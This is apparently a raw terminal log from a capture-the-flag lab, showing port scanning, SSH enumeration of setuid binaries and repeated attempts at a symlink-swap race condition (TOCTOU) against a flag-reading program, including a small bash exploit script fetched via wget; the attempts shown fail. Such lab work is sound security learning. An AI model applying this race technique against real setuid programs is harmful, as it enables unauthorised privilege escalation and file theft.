

:~# nmap -p- -T4 10.10.250.211
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-23 00:58 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.250.211
Host is up (0.00025s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:EB:C7:8F:41:21 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.58 seconds



root@ip-10-10-255-30:~# ssh race@10.10.250.211
The authenticity of host '10.10.250.211 (10.10.250.211)' can't be established.
ECDSA key fingerprint is SHA256:SKwIjqlJLjZU5/Ah0lY+8M3/4H5ay25q3Bu9S6gw+A4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.250.211' (ECDSA) to the list of known hosts.
race@10.10.250.211's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-143-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Oct 22 11:59:48 PM UTC 2025

  System load:  0.32              Processes:             113
  Usage of /:   44.4% of 9.75GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for ens5: 10.10.250.211
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Thu Jun  8 16:31:40 2023
race@ip-10-10-250-211:~$ 



race@ip-10-10-250-211:~$ whoami
race
race@ip-10-10-250-211:~$ pwd
/home/race
race@ip-10-10-250-211:~$ id
uid=1000(race) gid=1000(race) groups=1000(race),4(adm),24(cdrom),30(dip),46(plugdev)
race@ip-10-10-250-211:~$ 



race@ip-10-10-250-211:~$ ls -lah
total 36K
drwxr-xr-x 5 race race 4.0K Jun  8  2023 .
drwxr-xr-x 8 root root 4.0K Oct 22 23:56 ..
-rw------- 1 race race   22 Jun  8  2023 .bash_history
-rw-r--r-- 1 race race  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 race race 3.7K Jan  6  2022 .bashrc
drwx------ 3 race race 4.0K Mar 27  2023 .cache
drwxrwxr-x 3 race race 4.0K Mar 27  2023 .local
-rw-r--r-- 1 race race  807 Jan  6  2022 .profile
drwx------ 2 race race 4.0K Mar 27  2023 .ssh




race@ip-10-10-250-211:~$ find / -tupe f -executable -user race 2>/dev/null
race@ip-10-10-250-211:~$ find / -type f -executable -user race 2>/dev/null
race@ip-10-10-250-211:~$ cd ..
race@ip-10-10-250-211:/home$ ls
race  run  sprint  ssm-user  ubuntu  walk



race@ip-10-10-250-211:/home$ ls -lah
total 32K
drwxr-xr-x  8 root     root     4.0K Oct 22 23:56 .
drwxr-xr-x 19 root     root     4.0K Oct 22 23:56 ..
drwxr-xr-x  5 race     race     4.0K Jun  8  2023 race
drwxr-xr-x  2 run      run      4.0K Mar 27  2023 run
drwxr-xr-x  2 sprint   sprint   4.0K Mar 27  2023 sprint
drwxr-x---  2 ssm-user ssm-user 4.0K Jul  5 15:38 ssm-user
drwxr-x---  3 ubuntu   ubuntu   4.0K Oct 22 23:56 ubuntu
drwxr-xr-x  2 walk     walk     4.0K Mar 27  2023 walk
race@ip-10-10-250-211:/home$ cd walk
race@ip-10-10-250-211:/home/walk$ ls -lah
total 44K
drwxr-xr-x 2 walk walk 4.0K Mar 27  2023 .
drwxr-xr-x 8 root root 4.0K Oct 22 23:56 ..
-rwsr-sr-x 1 walk walk  16K Mar 27  2023 anti_flag_reader
-rw-r--r-- 1 walk walk 1.1K Mar 27  2023 anti_flag_reader.c
-rw-r--r-- 1 walk walk  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 walk walk 3.7K Jan  6  2022 .bashrc
-rw------- 1 walk walk   41 Mar 27  2023 flag
-rw-r--r-- 1 walk walk  807 Jan  6  2022 .profile
race@ip-10-10-250-211:/home/walk$ cat flag
cat: flag: Permission denied
race@ip-10-10-250-211:/home/walk$ cd ..
race@ip-10-10-250-211:/home$ cd sprint
race@ip-10-10-250-211:/home/sprint$ ls -lah
total 48K
drwxr-xr-x 2 sprint sprint 4.0K Mar 27  2023 .
drwxr-xr-x 8 root   root   4.0K Oct 22 23:56 ..
-rwsr-sr-x 1 sprint sprint  17K Mar 27  2023 bankingsystem
-rw-r--r-- 1 sprint sprint 2.9K Mar 27  2023 bankingsystem.c
-rw-r--r-- 1 sprint sprint  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 sprint sprint 3.7K Jan  6  2022 .bashrc
-rw------- 1 sprint sprint   40 Mar 27  2023 flag
-rw-r--r-- 1 sprint sprint  807 Jan  6  2022 .profile
race@ip-10-10-250-211:/home/sprint$ cd ..
race@ip-10-10-250-211:/home$ cd run
race@ip-10-10-250-211:/home/run$ ls -lah
total 44K
drwxr-xr-x 2 run  run  4.0K Mar 27  2023 .
drwxr-xr-x 8 root root 4.0K Oct 22 23:56 ..
-rw-r--r-- 1 run  run   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 run  run  3.7K Jan  6  2022 .bashrc
-rwsr-sr-x 1 run  run   16K Mar 27  2023 cat2
-rw-r--r-- 1 run  run  1.4K Mar 27  2023 cat2.c
-rw------- 1 run  run    46 Mar 27  2023 flag
-rw-r--r-- 1 run  run   807 Jan  6  2022 .profile
race@ip-10-10-250-211:/home/run$ cd ..
race@ip-10-10-250-211:/home$ cd ubuntu
-bash: cd: ubuntu: Permission denied
race@ip-10-10-250-211:/home$ ls
race  run  sprint  ssm-user  ubuntu  walk
race@ip-10-10-250-211:/home$ cd ssm-user
-bash: cd: ssm-user: Permission denied
race@ip-10-10-250-211:/home$ cat /home/walk/anti_flag_reader.c
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <assert.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp) {

    int n;
    char buf[1024];
    struct stat lstat_buf;

    if (argc != 2) {
        puts("Usage: anti_flag_reader <FILE>");
        return 1;
    }
    
    puts("Checking if 'flag' is in the provided file path...");
    int path_check = strstr(argv[1], "flag");
    puts("Checking if the file is a symlink...");
    lstat(argv[1], &lstat_buf);
    int symlink_check = (S_ISLNK(lstat_buf.st_mode));
    puts("<Press Enter to continue>");
    getchar();
    
    if (path_check || symlink_check) {
        puts("Nice try, but I refuse to give you the flag!");
        return 1;
    } else {
        puts("This file can't possibly be the flag. I'll print it out for you:\n");
        int fd = open(argv[1], 0);
        assert(fd >= 0 && "Failed to open the file");
        while((n = read(fd, buf, 1024)) > 0 && write(1, buf, n) > 0);
    }
    
    return 0;
}
race@ip-10-10-250-211:/home$ 





race@ip-10-10-250-211:/home$ echo "oi" > /tmp/fake.txt


race@ip-10-10-250-211:/home$ cd /tmp
race@ip-10-10-250-211:/tmp$ ls
fake.txt

race@ip-10-10-250-211:/tmp$ cat fake.txt
oi


race@ip-10-10-250-211:/tmp$ ln -s /tmp/fake.txt /tmp/input



race@ip-10-10-250-211:/tmp$ /home/walk/anti_flag_reader /tmp/input
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>



<p>in another session</p>

race@ip-10-10-250-211:~$ rm /tmp/input
race@ip-10-10-250-211:~$ ln -s /home/walk/flag /tmp/input
race@ip-10-10-250-211:~$ 


<p>in the first session</p>


race@ip-10-10-250-211:/tmp$ /home/walk/anti_flag_reader /tmp/input
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>

Nice try, but I refuse to give you the flag!






:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.250.211 - - [23/Oct/2025 01:20:16] "GET /exploit.sh HTTP/1.1" 200 -





:~# cat exploit.sh
#!/bin/bash

# Cria arquivo falso
echo "fake" > /tmp/fake.txt

# Cria link simbólico inicial
ln -s /tmp/fake.txt /tmp/input

# Executa o binário em background
/home/walk/anti_flag_reader /tmp/input &

# Aguarda 1 segundo (ajuste se necessário)
sleep 1

# Troca o link para apontar para o flag
rm /tmp/input
ln -s /home/walk/flag /tmp/input





race@ip-10-10-250-211:/tmp$ wget http://10.10.255.30:8000/exploit.sh
--2025-10-23 00:20:16--  http://10.10.255.30:8000/exploit.sh
Connecting to 10.10.255.30:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 343 [text/x-sh]
Saving to: \u2018exploit.sh\u2019

exploit.sh                      100%[=======================================================>]     343  --.-KB/s    in 0s      

2025-10-23 00:20:16 (39.9 MB/s) - \u2018exploit.sh\u2019 saved [343/343]

race@ip-10-10-250-211:/tmp$ chmod +x exploit.sh




race@ip-10-10-250-211:/tmp$ ./exploit.sh
ln: failed to create symbolic link '/tmp/input': File exists
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
Nice try, but I refuse to give you the flag!


race@ip-10-10-250-211:/tmp$ nano exploit.sh


race@ip-10-10-250-211:/tmp$ cat exploit.sh
#!/bin/bash

# Cria arquivo falso
echo "fake" > /tmp/fake.txt

#Remove qualquer link anterior
rm -f /tmp/input

# Cria link simbólico inicial
ln -s /tmp/fake.txt /tmp/input

# Executa o binário em background
/home/walk/anti_flag_reader /tmp/input &

# Aguarda 1 segundo (ajuste se necessário)
sleep 1

# Troca o link para apontar para o flag
rm -f /tmp/input
ln -s /home/walk/flag /tmp/input
race@ip-10-10-250-211:/tmp$ 






race@ip-10-10-250-211:/tmp$ ./exploit.sh
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
Nice try, but I refuse to give you the flag!





race@ip-10-10-250-211:/tmp$ chmod +x ex.sh
race@ip-10-10-250-211:/tmp$ ./ex.sh
[*] Criando arquivo falso...
[*] Iniciando tentativa automatizada...
[*] Tentativa 1...
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
Nice try, but I refuse to give you the flag!
[*] Tentativa 2...
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
Nice try, but I refuse to give you the flag!
[*] Tentativa 3...
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>
Nice try, but I refuse to give you the flag!
[*] Tentativa 4...
Checking if 'flag' is in the provided file path...
Checking if the file is a symlink...
<Press Enter to continue>








race@ip-10-10-250-211:/tmp$ ln -s /tmp/fake.txt /tmp/input




